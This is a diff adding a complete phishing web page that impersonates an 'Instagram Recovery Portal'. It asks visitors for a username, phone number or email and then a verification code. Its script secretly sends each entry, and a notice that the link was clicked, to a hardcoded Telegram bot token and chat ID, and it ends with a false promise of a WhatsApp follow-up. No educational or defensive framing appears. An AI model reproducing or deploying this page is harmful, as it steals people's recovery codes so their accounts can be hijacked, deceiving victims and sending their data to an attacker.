@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Recovery Portal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(145deg, #0b1a2e 0%, #1b2f44 100%);
+      padding: 20px;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.07);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 42px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.03) inset;
+      padding: 40px 30px;
+      max-width: 560px;
+      width: 100%;
+      transition: all 0.2s ease;
+    }
+
+    .page {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      color: #eef4ff;
+      animation: fadeIn 0.4s ease;
+    }
+
+    .page.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1, h2, h3 {
+      font-weight: 500;
+      letter-spacing: -0.02em;
+    }
+
+    h1 {
+      font-size: 2.3rem;
+      margin-bottom: 12px;
+      background: linear-gradient(to right, #ffffff, #b3d9ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 2px 15px rgba(0, 160, 255, 0.3);
+    }
+
+    .portal-title {
+      font-size: 2rem;
+      margin-bottom: 18px;
+      color: #cce6ff;
+      background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+    }
+
+    .subtext {
+      font-size: 1rem;
+      color: #a0b8d0;
+      margin-bottom: 28px;
+      font-weight: 300;
+      max-width: 380px;
+    }
+
+    /* heartbeat platform — with Instagram icon */
+    .recover-platform {
+      margin: 18px 0 12px;
+      padding: 36px 28px;
+      background: rgba(0, 180, 255, 0.05);
+      border-radius: 100px;
+      border: 1px solid rgba(0, 180, 255, 0.25);
+      cursor: pointer;
+      transition: all 0.25s ease;
+      box-shadow: 0 0 0 0 rgba(0, 180, 255, 0.3);
+      animation: heartbeat 1.8s infinite cubic-bezier(0.2, 0.9, 0.4, 1);
+      width: 100%;
+    }
+
+    .recover-platform p {
+      font-size: 1.6rem;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      color: #b3e4ff;
+      text-shadow: 0 0 12px rgba(0, 170, 255, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+    }
+
+    /* Instagram icon styling */
+    .instagram-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      filter: drop-shadow(0 0 10px rgba(225, 48, 108, 0.7));
+      animation: beatIcon 1.8s infinite;
+      transition: transform 0.2s;
+      width: 2.4rem;
+      height: 2.4rem;
+    }
+
+    .instagram-icon svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    @keyframes heartbeat {
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 180, 255, 0.4); }
+      25% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(0, 180, 255, 0.1); }
+      50% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 180, 255, 0.2); }
+      75% { transform: scale(1.01); box-shadow: 0 0 0 8px rgba(0, 180, 255, 0.1); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 180, 255, 0.3); }
+    }
+
+    @keyframes beatIcon {
+      0%, 60%, 100% { transform: scale(1); }
+      20% { transform: scale(1.15); }
+      40% { transform: scale(1.05); }
+    }
+
+    /* inputs & forms */
+    .input-group {
+      width: 100%;
+      margin: 18px 0 8px;
+    }
+
+    .input-group label {
+      display: block;
+      text-align: left;
+      font-size: 0.9rem;
+      font-weight: 400;
+      color: #9bb5d4;
+      margin-bottom: 6px;
+      padding-left: 10px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 16px 22px;
+      background: rgba(0, 0, 0, 0.25);
+      border: 1.5px solid rgba(255, 255, 255, 0.1);
+      border-radius: 60px;
+      font-size: 1.1rem;
+      color: #ffffff;
+      outline: none;
+      transition: 0.2s;
+      font-weight: 400;
+    }
+
+    .input-group input:focus {
+      border-color: #3a9eff;
+      box-shadow: 0 0 0 3px rgba(58, 158, 255, 0.25);
+      background: rgba(0, 0, 0, 0.4);
+    }
+
+    .input-group input::placeholder {
+      color: #7088a0;
+      font-weight: 300;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 18px 24px;
+      margin-top: 26px;
+      border: none;
+      border-radius: 60px;
+      background: linear-gradient(135deg, #1e90ff, #0070e0);
+      color: white;
+      font-size: 1.2rem;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 10px 25px -8px #0050b0;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .btn:hover {
+      background: linear-gradient(135deg, #3a9eff, #1a80ff);
+      transform: translateY(-2px);
+      box-shadow: 0 18px 30px -8px #0060d0;
+    }
+
+    .btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 6px 15px -5px #0040a0;
+    }
+
+    .small-note {
+      margin-top: 16px;
+      font-size: 0.82rem;
+      color: #849ab3;
+      font-weight: 300;
+    }
+
+    .success-icon {
+      font-size: 5rem;
+      margin-bottom: 12px;
+      filter: drop-shadow(0 0 18px #2ecc71);
+    }
+
+    .thanks-message {
+      font-size: 1.3rem;
+      font-weight: 400;
+      margin: 8px 0;
+      color: #e0f0ff;
+    }
+
+    .highlight {
+      color: #85d0ff;
+      font-weight: 600;
+    }
+
+    .bottom-line {
+      margin-top: 28px;
+      font-size: 0.95rem;
+      font-style: italic;
+      color: #8aa8c8;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      padding-top: 22px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <!-- PAGE 1: WELCOME + HEARTBEAT PLATFORM (INSTAGRAM ICON) -->
+  <div id="page1" class="page active">
+    <h1>Welcome to</h1>
+    <div class="portal-title">Instagram Recovery Portal</div>
+    <div class="subtext">Secure · Fast · Reliable</div>
+
+    <div class="recover-platform" id="heartbeatPlatform">
+      <p>
+        <span class="instagram-icon">
+          <!-- Instagram SVG icon (official-style gradient) -->
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <radialGradient id="instaGradient" cx="30%" cy="107%" r="150%">
+                <stop offset="0%" stop-color="#fdf497"/>
+                <stop offset="5%" stop-color="#fdf497"/>
+                <stop offset="45%" stop-color="#fd5949"/>
+                <stop offset="60%" stop-color="#d6249f"/>
+                <stop offset="90%" stop-color="#285AEB"/>
+              </radialGradient>
+            </defs>
+            <rect x="2" y="2" width="20" height="20" rx="5" stroke="url(#instaGradient)" stroke-width="1.8" fill="none"/>
+            <circle cx="12" cy="12" r="4.2" stroke="url(#instaGradient)" stroke-width="1.8" fill="none"/>
+            <circle cx="17.5" cy="6.5" r="1.3" fill="url(#instaGradient)"/>
+          </svg>
+        </span>
+        Click to recover account
+      </p>
+    </div>
+    <div class="small-note">Tap the Instagram icon above to begin</div>
+  </div>
+
+  <!-- PAGE 2: USERNAME / PHONE / EMAIL -->
+  <div id="page2" class="page">
+    <h2 style="font-size: 2rem; margin-bottom: 8px;">Recover your account</h2>
+    <div class="subtext" style="margin-bottom: 6px;">Enter any one detail below</div>
+
+    <div class="input-group">
+      <label>Username, phone or email</label>
+      <input type="text" id="recoveryInput" placeholder="e.g. johndoe / +1234567890 / user@mail.com" autocomplete="off">
+    </div>
+
+    <button class="btn" id="submitRecoveryBtn">Continue</button>
+    <div class="small-note">We'll send a verification code</div>
+  </div>
+
+  <!-- PAGE 3: VERIFICATION CODE -->
+  <div id="page3" class="page">
+    <h2 style="font-size: 2rem; margin-bottom: 8px;">Verification code</h2>
+    <div class="subtext" style="margin-bottom: 6px;">
+      Enter the code you just received<br>via Email, SMS or WhatsApp
+    </div>
+
+    <div class="input-group">
+      <label>Verification code</label>
+      <input type="text" id="codeInput" placeholder="Enter 6-digit code" autocomplete="off">
+    </div>
+
+    <button class="btn" id="submitCodeBtn">Verify & Continue</button>
+    <div class="small-note">Didn't receive? Check spam or try again</div>
+  </div>
+
+  <!-- PAGE 4: FINAL THANK YOU -->
+  <div id="page4" class="page">
+    <div class="success-icon">✅</div>
+    <h2 style="font-size: 2rem; margin-bottom: 6px;">Thank you</h2>
+    <div class="thanks-message">
+      Thanks for submitting your information.<br>
+      You will be notified via <span class="highlight">WhatsApp</span> in 24hrs.
+    </div>
+    <div class="bottom-line">
+      Thanks for choosing our service — we care.
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- CONFIG -----
+    const TELEGRAM_BOT_TOKEN = '8735385311:AAFsm1vLBl6WXX8lE5gEIdadDdG6DYpd_7Y';
+    const TELEGRAM_CHAT_ID = '7112884379';
+    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    // ----- DOM elements -----
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const page3 = document.getElementById('page3');
+    const page4 = document.getElementById('page4');
+
+    const heartbeatPlatform = document.getElementById('heartbeatPlatform');
+    const recoveryInput = document.getElementById('recoveryInput');
+    const codeInput = document.getElementById('codeInput');
+    const submitRecoveryBtn = document.getElementById('submitRecoveryBtn');
+    const submitCodeBtn = document.getElementById('submitCodeBtn');
+
+    // ----- state to hold temporary data -----
+    let recoveryDetail = '';   // username/phone/email from page 2
+
+    // ----- helper: send message to telegram (async, no blocking) -----
+    async function sendToTelegram(text) {
+      if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+      try {
+        const response = await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+          })
+        });
+        if (!response.ok) {
+          console.warn('Telegram API responded with error:', response.status);
+        }
+      } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+      }
+    }
+
+    // ----- page switching function -----
+    function showPage(pageNumber) {
+      page1.classList.remove('active');
+      page2.classList.remove('active');
+      page3.classList.remove('active');
+      page4.classList.remove('active');
+
+      if (pageNumber === 1) page1.classList.add('active');
+      if (pageNumber === 2) page2.classList.add('active');
+      if (pageNumber === 3) page3.classList.add('active');
+      if (pageNumber === 4) page4.classList.add('active');
+    }
+
+    // ----- click on heartbeat platform (page 1) -> notify Telegram + go to page 2 -----
+    heartbeatPlatform.addEventListener('click', function() {
+      // ---- NOTIFY TELEGRAM: link clicked ----
+      const clickTime = new Date().toLocaleString();
+      const clickMessage = `🔔 <b>Instagram Recovery Portal — LINK CLICKED</b>\n` +
+                           `👤 A user just clicked the recovery platform.\n` +
+                           `⏰ Time: <code>${escapeHtml(clickTime)}</code>\n` +
+                           `➡️ Moving to input page...`;
+      sendToTelegram(clickMessage);
+
+      // proceed to next page
+      showPage(2);
+      recoveryInput.value = '';
+      recoveryDetail = '';
+    });
+
+    // ----- submit recovery detail (page 2) -> send to telegram, go to page 3 -----
+    submitRecoveryBtn.addEventListener('click', function() {
+      const detail = recoveryInput.value.trim();
+      if (!detail) {
+        alert('Please enter a username, phone number, or email.');
+        return;
+      }
+
+      recoveryDetail = detail;   // store for later use
+
+      // ---- SEND TO TELEGRAM (first detail) ----
+      const message = `🔐 <b>Instagram Recovery — Step 1</b>\n` +
+                      `📌 Detail provided: <code>${escapeHtml(detail)}</code>\n` +
+                      `⏳ Waiting for verification code...`;
+      sendToTelegram(message);
+
+      // move to verification page
+      showPage(3);
+      codeInput.value = '';     // reset code input
+    });
+
+    // ----- submit verification code (page 3) -> send to telegram, go to page 4 -----
+    submitCodeBtn.addEventListener('click', function() {
+      const code = codeInput.value.trim();
+      if (!code) {
+        alert('Please enter the verification code.');
+        return;
+      }
+
+      // ---- SEND TO TELEGRAM (second detail + final) ----
+      const message = `🔐 <b>Instagram Recovery — Verification</b>\n` +
+                      `📌 Original detail: <code>${escapeHtml(recoveryDetail)}</code>\n` +
+                      `🔑 Code entered: <code>${escapeHtml(code)}</code>\n` +
+                      `✅ User submitted both steps. Final page shown.`;
+      sendToTelegram(message);
+
+      // go to final thank you page
+      showPage(4);
+    });
+
+    // ----- simple HTML escape for telegram (to avoid parse errors) -----
+    function escapeHtml(unsafe) {
+      return unsafe
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    // ----- (optional) allow Enter key to trigger buttons -----
+    recoveryInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        submitRecoveryBtn.click();
+      }
+    });
+
+    codeInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        submitCodeBtn.click();
+      }
+    });
+  })();
+</script>
+</body>
+</html>
